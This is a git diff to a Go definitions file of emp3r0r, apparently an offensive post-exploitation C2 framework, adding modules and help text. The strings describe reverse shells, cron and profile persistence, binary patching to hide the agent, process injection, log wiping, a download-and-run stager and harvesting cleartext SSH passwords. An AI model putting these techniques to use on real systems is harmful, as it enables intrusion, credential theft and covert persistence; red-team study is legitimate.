@@ -2,17 +2,19 @@ package emp3r0r_data
 
 import (
 	"context"
+	"fmt"
 	"net/http"
 	"os"
 	"strconv"
 
+	"github.com/jaypipes/ghw"
 	"github.com/posener/h2conn"
 	"github.com/txthinking/socks5"
 )
 
 var (
 	// OneTimeMagicBytes as separator/password
-	OneTimeMagicBytes = []byte("c44ccf2a-c651-4cec-9f32-1ff9621b5518")
+	OneTimeMagicBytes = []byte("6byKQ3Hcidum0NCdvJGK0w==")
 
 	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
 	Transport = "HTTP2"
@@ -39,8 +41,8 @@ var (
 	GuardianAgentPath = "[persistence_agent_path]"
 
 	// will be updated by ReadJSONConfig
+	// in form https://host:port
 	CCAddress    = ""
-	LibPath      = ""
 	DefaultShell = ""
 
 	// AESKey generated from Tag -> md5sum, type: []byte
@@ -52,6 +54,7 @@ var (
 	// to be updated by DirSetup
 	Stub_Linux          = ""
 	Stub_Windows        = ""
+	Stub_Windows_DLL    = ""
 	Packer_Stub         = ""
 	Packer_Stub_Windows = ""
 )
@@ -62,7 +65,7 @@ const (
 
 	// Version hardcoded version string
 	// see https://github.com/googleapis/release-please/blob/f398bdffdae69772c61a82cd7158cca3478c2110/src/updaters/generic.ts#L30
-	Version = "v1.23.4" // x-release-please-version
+	Version = "v1.37.1" // x-release-please-version
 
 	// RShellBufSize buffer size of reverse shell stream
 	RShellBufSize = 128
@@ -76,6 +79,7 @@ const (
 
 // built-in module names
 const (
+	ModGenAgent     = "gen_agent"
 	ModCMD_EXEC     = "cmd_exec"
 	ModCLEAN_LOG    = "clean_log"
 	ModLPE_SUGGEST  = "lpe_suggest"
@@ -86,39 +90,63 @@ const (
 	ModVACCINE      = "vaccine"
 	ModINJECTOR     = "injector"
 	ModGET_ROOT     = "get_root"
-	ModREVERSEPROXY = "reverse_proxy"
+	ModBring2CC     = "bring2cc"
 	ModGDB          = "gdbserver"
+	ModStager       = "stager"
+	ModSSHHarvester = "ssh_harvester"
 )
 
 // PersistMethods CC calls one of these methods to get persistence, or all of them at once
 var PersistMethods = map[string]string{
-	"ld_preload": "ldPreload",
-	"profiles":   "profiles",
-	"service":    "service",
-	"injector":   "injector",
-	"cron":       "cronJob",
-	"patcher":    "patcher",
+	"profiles": "Add some aliases to shell profiles, will trigger when user logs in",
+	"cron":     "Add a cronjob",
+	"patcher":  "Patch binaries (ls, ps, pstree, sshd, bash, sh...) so they load loader.so on startup, it also make emp3r0r essentially invisible to those tools",
+}
+
+var InjectorMethods = map[string]string{
+	"shellcode":      "Inject shellcode (see wiki), if no shellcode is specified, it will inject guardian.asm (runs emp3r0r as child process)",
+	"shared_library": "Inject a shared library, if no library is specified, it will inject loader.so (ELF loader that runs emp3r0r agent)",
 }
 
 // Module help info, ls_modules shows this
 var ModuleComments = map[string]string{
+	ModGenAgent:     "Build agent for different OS/arch with customized options",
 	ModCMD_EXEC:     "Run a single command on a target",
 	ModCLEAN_LOG:    "Delete lines containing keyword from *tmp logs",
 	ModLPE_SUGGEST:  "Run linux-smart-enumeration or linux exploit suggester",
 	ModPERSISTENCE:  "Get persistence via built-in methods",
-	ModPROXY:        "Start a socks proxy on target, and use it locally on C2 side",
+	ModPROXY:        "Start a socks proxy on target host, and use it locally on C2 side, so you can access network resources on agent side",
 	ModPORT_FWD:     "Port mapping from agent to CC (or vice versa), via HTTP2 (or other) tunnel",
 	ModSHELL:        "Run custom bash on target, a perfect reverse shell",
 	ModVACCINE:      "Vaccine helps you install additional tools on target system",
 	ModINJECTOR:     "Inject shellcode/loader.so into a running process",
 	ModGET_ROOT:     "Try some built-in LPE exploits",
-	ModREVERSEPROXY: "Manually proxy agents who are unable to use our forward proxy",
+	ModBring2CC:     "Bring a target host to CC by connecting to it first (target host must have agent installed)",
 	ModGDB:          "Remote gdbserver, debug anything",
+	ModStager:       "Generate a stager for staged payload delivering",
+	ModSSHHarvester: "Harvest cleartext password automatically from OpenSSH server process",
 }
 
 // Module help for options, does not include every module since not all modules need args
 // help module shows this
 var ModuleHelp = map[string]map[string]string{
+	ModGenAgent: {
+		"os":                "Target OS, available OS: linux, windows, dll",
+		"arch":              "Target architecture, available arch: amd64, 386, arm, arm64, etc",
+		"cc_host":           "CC host (IP/domain name)",
+		"cc_indicator":      "CC indicator, eg. https://github.com/xxx/xxx/releases/download/xxx/xx.txt",
+		"indicator_text":    "Indicator text, eg. emp3r0r",
+		"ncsi":              "Use NCSI (Network Connectivity Status Indicator) to check internet access",
+		"cdn_proxy":         "Use CDN as C2 transport, eg. wss://yourcdn.com/yourpath",
+		"shadowsocks":       "Use shadowsocks as C2 transport, if you want to use KCP, please select with_kcp",
+		"c2transport_proxy": "Use a proxy for C2 transport, eg. socks5://127.0.0.1:9050",
+		"auto_proxy":        "Use auto proxy server for bring2cc and so on (will enable UDP broadcast)",
+		"autoproxy_timeout": "Auto proxy timeout in seconds",
+		"doh_server":        "Use DNS over HTTPS (DoH) for DNS, eg. https://dns.google/dns-query",
+	},
+	ModPERSISTENCE: {
+		"method": fmt.Sprintf("Persistence method: profiles: %s; cron: %s; patcher: %s", PersistMethods["profiles"], PersistMethods["cron"], PersistMethods["patcher"]),
+	},
 	ModCMD_EXEC: {
 		"cmd_to_exec": "Press TAB for some hints",
 	},
@@ -126,7 +154,7 @@ var ModuleHelp = map[string]map[string]string{
 		"keyword": "Delete all log entries containing this keyword",
 	},
 	ModLPE_SUGGEST: {
-		"lpe_helper": "'linux-smart-enumeration' or 'linux-exploit-suggester'?",
+		"lpe_helper": "Which LPE helper to use, available helpers: lpe_les (Linux exploit suggester), lpe_lse (Linux smart enumeration), lpe_linpeas (PEASS-ng, works on Linux), lpe_winpeas (PEASS-ng, works on Windows",
 	},
 	ModPROXY: {
 		"port":   "Port of our local proxy server",
@@ -136,6 +164,7 @@ var ModuleHelp = map[string]map[string]string{
 		"to":          "Address:Port (to forward to) on agent/CC side",
 		"listen_port": "Listen port on CC/agent side",
 		"switch":      "Turn port mapping on/off, or use `reverse` mapping",
+		"protocol":    "Forward to TCP or UDP port on agent side",
 	},
 	ModSHELL: {
 		"shell": "Shell program to run",
@@ -144,10 +173,14 @@ var ModuleHelp = map[string]map[string]string{
 	},
 	ModINJECTOR: {
 		"pid":    "Target process PID, set to 0 to start a new process (sleep)",
-		"method": "Use `inject_shellcode` to inject any shellcode, use `*_loader` to inject loader.so",
+		"method": fmt.Sprintf("Injection method, available methods: shellcode: %s; shared_library: %s", InjectorMethods["shellcode"], InjectorMethods["shared_library"]),
 	},
-	ModREVERSEPROXY: {
+	ModBring2CC: {
 		"addr": "Target host to proxy, we will connect to it and proxy it out",
+	},
+	ModStager: {
+		"type":       "Stager format, eg. bash script",
+		"agent_path": "Path to the agent binary that will be downloaded and executed on target hosts",
 	},
 }
 
@@ -164,36 +197,38 @@ const (
 	C2CmdPortFwd       = "!port_fwd"
 	C2CmdProxy         = "!proxy"
 	C2CmdSSHD          = "!sshd"
+	C2CmdSSHHarvester  = "!ssh_harvester"
 	C2CmdLPE           = "!lpe"
-	C2CmdReverseProxy  = "!" + ModREVERSEPROXY
+	C2CmdBring2CC      = "!" + ModBring2CC
 	C2CmdStat          = "!stat"
 )
 
 // AgentSystemInfo agent properties
 type AgentSystemInfo struct {
-	Tag         string        `json:"Tag"`         // identifier of the agent
-	Name        string        `json:"Name"`        // short name of the agent
-	Version     string        `json:"Version"`     // agent version
-	Transport   string        `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
-	Hostname    string        `json:"Hostname"`    // Hostname and machine ID
-	Hardware    string        `json:"Hardware"`    // machine details and hypervisor
-	Container   string        `json:"Container"`   // container tech (if any)
-	CPU         string        `json:"CPU"`         // CPU info
-	GPU         string        `json:"GPU"`         // GPU info
-	Mem         string        `json:"Mem"`         // memory size
-	OS          string        `json:"OS"`          // OS name and version
-	GOOS        string        `json:"GOOS"`        // runtime.GOOS
-	Kernel      string        `json:"Kernel"`      // kernel release
-	Arch        string        `json:"Arch"`        // kernel architecture
-	From        string        `json:"From"`        // where the agent is coming from, usually a public IP, or 127.0.0.1
-	IPs         []string      `json:"IPs"`         // IPs that are found on target's NICs
-	ARP         []string      `json:"ARP"`         // ARP table
-	User        string        `json:"User"`        // user account info
-	HasRoot     bool          `json:"HasRoot"`     // is agent run as root?
-	HasTor      bool          `json:"HasTor"`      // is agent from Tor?
-	HasInternet bool          `json:"HasInternet"` // has internet access?
-	Process     *AgentProcess `json:"Process"`     // agent's process
-	Exes        []string      `json:"Exes"`        // executables found in agent's $PATH
+	Tag         string           `json:"Tag"`         // identifier of the agent
+	Name        string           `json:"Name"`        // short name of the agent
+	Version     string           `json:"Version"`     // agent version
+	Transport   string           `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
+	Hostname    string           `json:"Hostname"`    // Hostname and machine ID
+	Hardware    string           `json:"Hardware"`    // machine details and hypervisor
+	Container   string           `json:"Container"`   // container tech (if any)
+	CPU         string           `json:"CPU"`         // CPU info
+	GPU         string           `json:"GPU"`         // GPU info
+	Mem         string           `json:"Mem"`         // memory size
+	OS          string           `json:"OS"`          // OS name and version
+	GOOS        string           `json:"GOOS"`        // runtime.GOOS
+	Kernel      string           `json:"Kernel"`      // kernel release
+	Arch        string           `json:"Arch"`        // kernel architecture
+	From        string           `json:"From"`        // where the agent is coming from, usually a public IP, or 127.0.0.1
+	IPs         []string         `json:"IPs"`         // IPs that are found on target's NICs
+	ARP         []string         `json:"ARP"`         // ARP table
+	User        string           `json:"User"`        // user account info
+	HasRoot     bool             `json:"HasRoot"`     // is agent run as root?
+	HasTor      bool             `json:"HasTor"`      // is agent from Tor?
+	HasInternet bool             `json:"HasInternet"` // has internet access?
+	Process     *AgentProcess    `json:"Process"`     // agent's process
+	Exes        []string         `json:"Exes"`        // executables found in agent's $PATH
+	Product     *ghw.ProductInfo `json:"Product"`     // product info
 }
 
 // AgentProcess process info of our agent
